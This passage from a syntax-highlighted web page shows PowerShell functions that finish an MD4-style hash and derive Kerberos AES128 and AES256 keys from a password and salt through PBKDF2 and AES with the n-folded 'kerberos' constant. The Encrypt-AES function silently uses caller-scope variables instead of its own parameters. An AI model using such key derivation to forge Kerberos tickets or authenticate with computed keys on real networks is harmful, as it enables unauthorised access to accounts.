</span></span><span class=line><span class=cl>        <span class=nv>$A</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$A</span> <span class=p>+</span> <span class=p>(</span><span class=n>HH</span> <span class=n>-X</span> <span class=nv>$B</span> <span class=n>-Y</span> <span class=nv>$C</span> <span class=n>-Z</span> <span class=nv>$D</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>12</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>15</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x6ED9EBA1</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$D</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$D</span> <span class=p>+</span> <span class=p>(</span><span class=n>HH</span> <span class=n>-X</span> <span class=nv>$A</span> <span class=n>-Y</span> <span class=nv>$B</span> <span class=n>-Z</span> <span class=nv>$C</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>44</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>47</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x6ED9EBA1</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>9</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$C</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$C</span> <span class=p>+</span> <span class=p>(</span><span class=n>HH</span> <span class=n>-X</span> <span class=nv>$D</span> <span class=n>-Y</span> <span class=nv>$A</span> <span class=n>-Z</span> <span class=nv>$B</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>28</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>31</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x6ED9EBA1</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>11</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$B</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$B</span> <span class=p>+</span> <span class=p>(</span><span class=n>HH</span> <span class=n>-X</span> <span class=nv>$C</span> <span class=n>-Y</span> <span class=nv>$D</span> <span class=n>-Z</span> <span class=nv>$A</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>60</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>63</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x6ED9EBA1</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>15</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c># Round 3 end</span>
</span></span><span class=line><span class=cl>        <span class=c># Increment start</span>
</span></span><span class=line><span class=cl>        <span class=nv>$A</span> <span class=p>=</span> <span class=p>(</span><span class=nv>$A</span> <span class=p>+</span> <span class=nv>$AA</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span>
</span></span><span class=line><span class=cl>        <span class=nv>$B</span> <span class=p>=</span> <span class=p>(</span><span class=nv>$B</span> <span class=p>+</span> <span class=nv>$BB</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span>
</span></span><span class=line><span class=cl>        <span class=nv>$C</span> <span class=p>=</span> <span class=p>(</span><span class=nv>$C</span> <span class=p>+</span> <span class=nv>$CC</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span>
</span></span><span class=line><span class=cl>        <span class=nv>$D</span> <span class=p>=</span> <span class=p>(</span><span class=nv>$D</span> <span class=p>+</span> <span class=nv>$DD</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span>
</span></span><span class=line><span class=cl>        <span class=c># Increment end</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c># Output start</span>
</span></span><span class=line><span class=cl>    <span class=nv>$A</span> <span class=p>=</span> <span class=p>(</span><span class=s1>&#39;{0:x8}&#39;</span> <span class=o>-f</span> <span class=nv>$A</span><span class=p>)</span> <span class=o>-ireplace</span> <span class=s1>&#39;^(\w{2})(\w{2})(\w{2})(\w{2})$&#39;</span><span class=p>,</span> <span class=s1>&#39;$4$3$2$1&#39;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$B</span> <span class=p>=</span> <span class=p>(</span><span class=s1>&#39;{0:x8}&#39;</span> <span class=o>-f</span> <span class=nv>$B</span><span class=p>)</span> <span class=o>-ireplace</span> <span class=s1>&#39;^(\w{2})(\w{2})(\w{2})(\w{2})$&#39;</span><span class=p>,</span> <span class=s1>&#39;$4$3$2$1&#39;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$C</span> <span class=p>=</span> <span class=p>(</span><span class=s1>&#39;{0:x8}&#39;</span> <span class=o>-f</span> <span class=nv>$C</span><span class=p>)</span> <span class=o>-ireplace</span> <span class=s1>&#39;^(\w{2})(\w{2})(\w{2})(\w{2})$&#39;</span><span class=p>,</span> <span class=s1>&#39;$4$3$2$1&#39;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$D</span> <span class=p>=</span> <span class=p>(</span><span class=s1>&#39;{0:x8}&#39;</span> <span class=o>-f</span> <span class=nv>$D</span><span class=p>)</span> <span class=o>-ireplace</span> <span class=s1>&#39;^(\w{2})(\w{2})(\w{2})(\w{2})$&#39;</span><span class=p>,</span> <span class=s1>&#39;$4$3$2$1&#39;</span>
</span></span><span class=line><span class=cl>    <span class=c># Output end</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$UpperCase</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;</span><span class=nv>$A$B$C$D</span><span class=s2>&#34;</span><span class=p>.</span><span class=py>ToUpper</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;</span><span class=nv>$A$B$C$D</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span><span class=w> </span><span class=nb>Get-PBKDF2</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>param</span> <span class=p>(</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)]</span><span class=nv>$PasswordString</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)]</span><span class=nv>$SALT</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)][</span><span class=nb>ValidateSet</span><span class=p>(</span><span class=s2>&#34;16&#34;</span><span class=p>,</span> <span class=s2>&#34;32&#34;</span><span class=p>)][</span><span class=no>String[]</span><span class=p>]</span><span class=nv>$KeySize</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>### Set Key Size</span>
</span></span><span class=line><span class=cl><span class=k>switch</span><span class=p>(</span><span class=nv>$KeySize</span><span class=p>){</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;16&#34;</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=no>int</span><span class=p>]</span> <span class=nv>$size</span> <span class=p>=</span> <span class=mf>16</span>
</span></span><span class=line><span class=cl>    <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;32&#34;</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=no>int</span><span class=p>]</span> <span class=nv>$size</span> <span class=p>=</span> <span class=mf>32</span>
</span></span><span class=line><span class=cl>    <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>     <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>default</span><span class=p>{}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$password</span> <span class=p>=</span> <span class=p>[</span><span class=no>Text.Encoding</span><span class=p>]::</span><span class=n>UTF8</span><span class=p>.</span><span class=py>GetBytes</span><span class=p>(</span><span class=nv>$PasswordString</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$saltBytes</span> <span class=p>=</span> <span class=p>[</span><span class=no>Text.Encoding</span><span class=p>]::</span><span class=n>UTF8</span><span class=p>.</span><span class=py>GetBytes</span><span class=p>(</span><span class=nv>$SALT</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>#PBKDF2 IterationCount=4096</span>
</span></span><span class=line><span class=cl><span class=nv>$deriveBytes</span> <span class=p>=</span> <span class=nb>new-Object</span> <span class=n>Security</span><span class=p>.</span><span class=py>Cryptography</span><span class=p>.</span><span class=py>Rfc2898DeriveBytes</span><span class=p>(</span><span class=nv>$password</span><span class=p>,</span> <span class=nv>$saltBytes</span><span class=p>,</span> <span class=mf>4096</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>&lt;#
</span></span></span><span class=line><span class=cl><span class=cm>$hexStringSALT = Get-HexStringFromByteArray -Data $deriveBytes.Salt    
</span></span></span><span class=line><span class=cl><span class=cm>Write-Host &#34;SALT (HEX):&#34;$hexStringSALT -ForegroundColor Yellow
</span></span></span><span class=line><span class=cl><span class=cm>#&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=nv>$deriveBytes</span><span class=p>.</span><span class=py>GetBytes</span><span class=p>(</span><span class=nv>$size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span><span class=w> </span><span class=nb>Encrypt-AES</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>param</span> <span class=p>(</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)]</span><span class=nv>$KeyData</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)]</span><span class=nv>$IVData</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)]</span><span class=nv>$Data</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>### AES 128-CTS</span>
</span></span><span class=line><span class=cl><span class=c># KeySize = 16</span>
</span></span><span class=line><span class=cl><span class=c># AESKey = Encrypt-AES -KeyData PBKdf2 -IVData IV -Data NFoldText</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>### AES 256-CTS</span>
</span></span><span class=line><span class=cl><span class=c># KeySize = 32</span>
</span></span><span class=line><span class=cl><span class=c># K1 = Encrypt-AES -KeyData PBKdf2 -IVData IV -Data NFoldText</span>
</span></span><span class=line><span class=cl><span class=c># K2 = Encrypt-AES -KeyData PBKdf2 -IVData IV -Data K1</span>
</span></span><span class=line><span class=cl><span class=c># AESKey = K1 + K2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Create AES Object</span>
</span></span><span class=line><span class=cl>    <span class=nv>$Aes</span> <span class=p>=</span> <span class=vm>$null</span>
</span></span><span class=line><span class=cl>    <span class=nv>$encryptor</span> <span class=p>=</span> <span class=vm>$null</span>
</span></span><span class=line><span class=cl>    <span class=nv>$memStream</span> <span class=p>=</span> <span class=vm>$null</span>
</span></span><span class=line><span class=cl>    <span class=nv>$cryptoStream</span> <span class=p>=</span> <span class=vm>$null</span>
</span></span><span class=line><span class=cl>    <span class=nv>$AESKey</span> <span class=p>=</span> <span class=vm>$null</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nv>$Aes</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Security</span><span class=p>.</span><span class=py>Cryptography</span><span class=p>.</span><span class=py>AesManaged</span>
</span></span><span class=line><span class=cl>    <span class=nv>$Aes</span><span class=p>.</span><span class=py>Mode</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Security.Cryptography.CipherMode</span><span class=p>]::</span><span class=n>CBC</span>
</span></span><span class=line><span class=cl>    <span class=nv>$Aes</span><span class=p>.</span><span class=py>Padding</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Security.Cryptography.PaddingMode</span><span class=p>]::</span><span class=n>None</span>
</span></span><span class=line><span class=cl>    <span class=nv>$Aes</span><span class=p>.</span><span class=py>BlockSize</span> <span class=p>=</span> <span class=mf>128</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$encryptor</span> <span class=p>=</span> <span class=nv>$Aes</span><span class=p>.</span><span class=py>CreateEncryptor</span><span class=p>(</span><span class=nv>$key</span><span class=p>,</span><span class=nv>$IV</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>$memStream</span> <span class=p>=</span> <span class=nb>new-Object</span> <span class=n>IO</span><span class=p>.</span><span class=py>MemoryStream</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$AESKey</span> <span class=p>=</span> <span class=vm>@</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nv>$cryptoStream</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Security</span><span class=p>.</span><span class=py>Cryptography</span><span class=p>.</span><span class=py>CryptoStream</span><span class=p>(</span><span class=nv>$memStream</span><span class=p>,</span> <span class=nv>$encryptor</span><span class=p>,</span> <span class=p>[</span><span class=no>System.Security.Cryptography.CryptoStreamMode</span><span class=p>]::</span><span class=n>Write</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>$cryptoStream</span><span class=p>.</span><span class=py>Write</span><span class=p>(</span><span class=nv>$Data</span><span class=p>,</span> <span class=mf>0</span><span class=p>,</span> <span class=nv>$Data</span><span class=p>.</span><span class=n>Length</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>$CryptoStream</span><span class=p>.</span><span class=py>FlushFinalBlock</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nv>$cryptoStream</span><span class=p>.</span><span class=py>Close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$AESKey</span> <span class=p>=</span> <span class=nv>$memStream</span><span class=p>.</span><span class=py>ToArray</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nv>$memStream</span><span class=p>.</span><span class=py>Close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nv>$Aes</span><span class=p>.</span><span class=py>Dispose</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$AESKey</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span><span class=w> </span><span class=nb>Get-AES128Key</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>param</span> <span class=p>(</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)]</span><span class=nv>$PasswordString</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)]</span><span class=nv>$SALT</span><span class=p>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$PBKDF2</span> <span class=p>=</span> <span class=nb>Get-PBKDF2</span> <span class=n>-PasswordString</span> <span class=nv>$passwordString</span> <span class=n>-SALT</span> <span class=nv>$SALT</span> <span class=n>-KeySize</span> <span class=mf>16</span>
</span></span><span class=line><span class=cl><span class=c>#[byte[]] $nFolded = (Get-NFold-Bytes -Data ([Text.Encoding]::ASCII.GetBytes(&#34;kerberos&#34;)) -KeySize 16)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$nFolded</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>107</span><span class=p>,</span><span class=mf>101</span><span class=p>,</span><span class=mf>114</span><span class=p>,</span><span class=mf>98</span><span class=p>,</span><span class=mf>101</span><span class=p>,</span><span class=mf>114</span><span class=p>,</span><span class=mf>111</span><span class=p>,</span><span class=mf>115</span><span class=p>,</span><span class=mf>123</span><span class=p>,</span><span class=mf>155</span><span class=p>,</span><span class=mf>91</span><span class=p>,</span><span class=mf>43</span><span class=p>,</span><span class=mf>147</span><span class=p>,</span><span class=mf>19</span><span class=p>,</span><span class=mf>43</span><span class=p>,</span><span class=mf>147</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$Key</span> <span class=p>=</span> <span class=nv>$PBKDF2</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$IV</span> <span class=p>=</span>  <span class=vm>@</span><span class=p>(</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$AES128Key</span> <span class=p>=</span> <span class=nb>Encrypt-AES</span> <span class=n>-KeyData</span> <span class=nv>$key</span> <span class=n>-IVData</span> <span class=nv>$IV</span> <span class=n>-Data</span> <span class=nv>$nFolded</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=vm>$</span><span class=p>(</span><span class=nb>Get-HexStringFromByteArray</span> <span class=n>-Data</span> <span class=nv>$AES128Key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span><span class=w> </span><span class=nb>Get-AES256Key</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>param</span> <span class=p>(</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)]</span><span class=nv>$PasswordString</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)]</span><span class=nv>$SALT</span><span class=p>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$PBKDF2</span> <span class=p>=</span> <span class=nb>Get-PBKDF2</span> <span class=n>-PasswordString</span> <span class=nv>$passwordString</span> <span class=n>-SALT</span> <span class=nv>$SALT</span> <span class=n>-KeySize</span> <span class=mf>32</span>
</span></span><span class=line><span class=cl><span class=c>#[byte[]] $nFolded = (Get-NFold-Bytes -Data ([Text.Encoding]::ASCII.GetBytes(&#34;kerberos&#34;)) -KeySize 16)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$nFolded</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>107</span><span class=p>,</span><span class=mf>101</span><span class=p>,</span><span class=mf>114</span><span class=p>,</span><span class=mf>98</span><span class=p>,</span><span class=mf>101</span><span class=p>,</span><span class=mf>114</span><span class=p>,</span><span class=mf>111</span><span class=p>,</span><span class=mf>115</span><span class=p>,</span><span class=mf>123</span><span class=p>,</span><span class=mf>155</span><span class=p>,</span><span class=mf>91</span><span class=p>,</span><span class=mf>43</span><span class=p>,</span><span class=mf>147</span><span class=p>,</span><span class=mf>19</span><span class=p>,</span><span class=mf>43</span><span class=p>,</span><span class=mf>147</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$Key</span> <span class=p>=</span> <span class=nv>$PBKDF2</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$IV</span> <span class=p>=</span>  <span class=vm>@</span><span class=p>(</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$k1</span> <span class=p>=</span> <span class=nb>Encrypt-AES</span> <span class=n>-KeyData</span> <span class=nv>$key</span> <span class=n>-IVData</span> <span class=nv>$IV</span> <span class=n>-Data</span> <span class=nv>$nFolded</span>
</span></span><span class=line><span class=cl><span class=nv>$k2</span> <span class=p>=</span> <span class=nb>Encrypt-AES</span> <span class=n>-KeyData</span> <span class=nv>$key</span> <span class=n>-IVData</span> <span class=nv>$IV</span> <span class=n>-Data</span> <span class=nv>$k1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$AES256Key</span> <span class=p>=</span> <span class=nv>$k1</span> <span class=p>+</span> <span class=nv>$k2</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=vm>$</span><span class=p>(</span><span class=nb>Get-HexStringFromByteArray</span> <span class=n>-Data</span> <span class=nv>$AES256Key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span><span class=w> </span><span class=nb>Get-HexStringFromByteArray</span><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>param</span> <span class=p>(</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>,</span><span class=na>Position</span><span class=p>=</span><span class=mf>0</span><span class=p>)][</span><span class=no>byte[]</span><span class=p>]</span><span class=nv>$Data</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nv>$hexString</span> <span class=p>=</span> <span class=vm>$null</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$sb</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Text</span><span class=p>.</span><span class=py>StringBuilder</span> <span class=p>(</span><span class=nv>$Data</span><span class=p>.</span><span class=py>Length</span> <span class=p>*</span> <span class=mf>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>foreach</span><span class=p>(</span><span class=nv>$b</span> <span class=k>in</span> <span class=nv>$Data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$sb</span><span class=p>.</span><span class=py>AppendFormat</span><span class=p>(</span><span class=s2>&#34;{0:x2}&#34;</span><span class=p>,</span> <span class=nv>$b</span><span class=p>)</span> <span class=p>|</span><span class=nb>Out-Null</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nv>$hexString</span> <span class=p>=</span> <span class=nv>$sb</span><span class=p>.</span><span class=py>ToString</span><span class=p>().</span><span class=py>ToUpper</span><span class=p>([</span><span class=no>CultureInfo</span><span class=p>]::</span><span class=n>InvariantCulture</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=nv>$hexString</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span><span class=w> </span><span class=nb>Get-ByteArrayFromHexString</span><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>param</span> 
</span></span><span class=line><span class=cl><span class=p>(</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)][</span><span class=no>String</span><span class=p>]</span><span class=nv>$HexString</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$i</span> <span class=p>=</span> <span class=mf>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$bytes</span> <span class=p>=</span> <span class=vm>@</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span><span class=p>(</span><span class=nv>$i</span> <span class=o>-lt</span> <span class=nv>$HexString</span><span class=p>.</span><span class=n>Length</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$chars</span> <span class=p>=</span> <span class=nv>$HexString</span><span class=p>.</span><span class=py>SubString</span><span class=p>(</span><span class=nv>$i</span><span class=p>,</span> <span class=mf>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nv>$b</span> <span class=p>=</span> <span class=p>[</span><span class=no>Convert</span><span class=p>]::</span><span class=n>ToByte</span><span class=p>(</span><span class=nv>$chars</span><span class=p>,</span> <span class=mf>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nv>$bytes</span> <span class=p>+=</span> <span class=nv>$b</span>
</span></span><span class=line><span class=cl>            <span class=nv>$i</span> <span class=p>=</span> <span class=nv>$i</span><span class=p>+</span><span class=mf>2</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=nv>$bytes</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
